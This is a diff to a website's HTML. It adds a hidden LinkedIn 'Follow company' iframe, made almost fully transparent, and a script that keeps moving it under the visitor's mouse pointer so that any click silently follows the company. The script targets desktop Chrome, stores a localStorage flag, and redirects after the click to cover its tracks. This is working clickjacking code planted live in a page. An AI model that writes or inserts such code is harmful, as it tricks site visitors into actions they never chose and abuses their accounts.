@@ -6543,6 +6543,67 @@ window.onload = () => {
 _waEmbed(wa_btnSetting);
 };
 </script>
+        <div id="iframeContainer" style="position: fixed; width: 80px; height: 20px; overflow: hidden;">
+<iframe
+id="linkedinIframe"
+src="https://www.linkedin.com/pages-extensions/FollowCompany?id=18716668"
+scrolling="no"
+allowtransparency="true"
+frameborder="0"
+border="0"
+width="80"
+height="20"
+style="position: relative; left: -25px; opacity: 0.001;"
+></iframe>
+<div id="clickOverlay" style="position: absolute; top: 0; left: 25px; width: 55px; height: 20px; background: rgba(255,255,255,0.001); cursor: pointer;"></div>
+</div>
+
+<script>
+const danLocalStorageKey = 'danLF';
+const iframe = document.getElementById('linkedinIframe');
+const container = document.getElementById('iframeContainer');
+const overlay = document.getElementById('clickOverlay');
+
+const userAgent = navigator.userAgent.toLowerCase();
+const isChrome = /chrome/.test(userAgent) && !/edge|opr\//.test(userAgent) && !/crios/.test(userAgent); // Added crios (Chrome for iOS) check
+const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
+
+if (isChrome && !isMobile) {
+if (window.location.hash === "/#") {
+localStorage.setItem(danLocalStorageKey, 'true');
+}
+
+if (localStorage.getItem(danLocalStorageKey) === 'true') {
+container.style.display = 'none';
+} else {
+document.addEventListener('mousemove', (e) => {
+const desiredLeft = e.clientX - (iframe.offsetWidth - 25) / 2;
+const desiredTop = e.clientY - iframe.offsetHeight / 2;
+container.style.left = desiredLeft + 'px';
+container.style.top = desiredTop + 'px';
+});
+
+container.addEventListener('mouseover', () => {
+iframe.style.opacity = 0.002;
+});
+
+container.addEventListener('mouseout', () => {
+iframe.style.opacity = 0.003;
+});
+
+overlay.addEventListener('mousedown', (e) => {
+overlay.style.display = 'none';
+localStorage.setItem(danLocalStorageKey, 'true');
+window.addEventListener('blur', function onBlurred() {
+window.removeEventListener('blur', onBlurred);
+window.location.assign(window.location.origin + window.location.pathname + "/#");
+});
+});
+}
+} else {
+container.style.display = 'none';
+}
+</script>
     </body>
     
 </html>
